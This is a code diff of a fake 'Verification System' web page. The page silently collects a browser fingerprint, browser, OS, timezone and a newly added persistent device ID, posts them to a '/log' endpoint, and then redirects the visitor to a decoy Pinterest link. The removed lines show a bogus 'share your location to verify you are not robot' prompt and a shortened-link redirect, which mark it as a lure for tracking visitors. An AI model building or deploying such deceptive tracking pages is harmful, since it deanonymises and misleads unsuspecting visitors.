@@ -3,10 +3,8 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-
   <title>Verification System</title>
 
-  <!-- ClientJS -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ClientJS/0.2.1/client.min.js"></script>
 
   <style>
@@ -14,30 +12,19 @@
       margin: 0;
       background: #0b0f19;
       color: white;
-      font-family: Arial, sans-serif;
-
+      font-family: Arial;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
     }
-
     .box {
       text-align: center;
       width: 90%;
       max-width: 400px;
     }
-
-    h1 {
-      font-size: 22px;
-      font-weight: 800;
-    }
-
-    .status {
-      margin-top: 12px;
-      color: #aaa;
-      font-size: 14px;
-    }
+    h1 { font-size: 22px; }
+    .status { margin-top: 12px; color: #aaa; }
   </style>
 </head>
 
@@ -53,15 +40,30 @@ function setStatus(msg) {
   document.getElementById("status").innerText = msg;
 }
 
+/* =========================
+   DEVICE ID SYSTEM
+========================= */
+
+// get or create stable ID
+function getDeviceId() {
+  let id = localStorage.getItem("device_id");
+
+  if (!id) {
+    id = crypto.randomUUID();
+    localStorage.setItem("device_id", id);
+  }
+
+  return id;
+}
+
 async function start() {
   try {
-    setStatus("Initializing ClientJS...");
+    setStatus("Loading...");
 
     const client = new ClientJS();
 
-    setStatus("Collecting device data...");
-
     const payload = {
+      device_id: getDeviceId(),   // ⭐ NEW STABLE ID
       fingerprint: client.getFingerprint(),
       browser: client.getBrowser(),
       os: client.getOS(),
@@ -69,33 +71,26 @@ async function start() {
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
     };
 
-    setStatus("Sending to server...");
+    setStatus("Sending data...");
 
-    const res = await fetch("/log", {
+    await fetch("/log", {
       method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload)
     });
 
-    await res.json();
+    setStatus("Success ✔ Redirecting...");
 
-    // SUCCESS MESSAGE
-    setStatus("Verification successful ✔");
-
-    // REDIRECT COUNTDOWN
-    let count = 5;
+    let c = 3;
 
     const timer = setInterval(() => {
-      setStatus("FAILED! \n SHARE YOUR LOCATION TO VERIFY YOU ARE NOT ROBOT. \nRedirecting... " + count);
-      count--;
+      setStatus("Redirecting... " + c);
+      c--;
 
-      if (count === 0) {
+      if (c === 0) {
         clearInterval(timer);
-
         window.location.href =
-          "https://urlto.me/2wTJ1";
+          "https://in.pinterest.com/pin/ice-cream--731694270723921320/";
       }
     }, 1000);
 
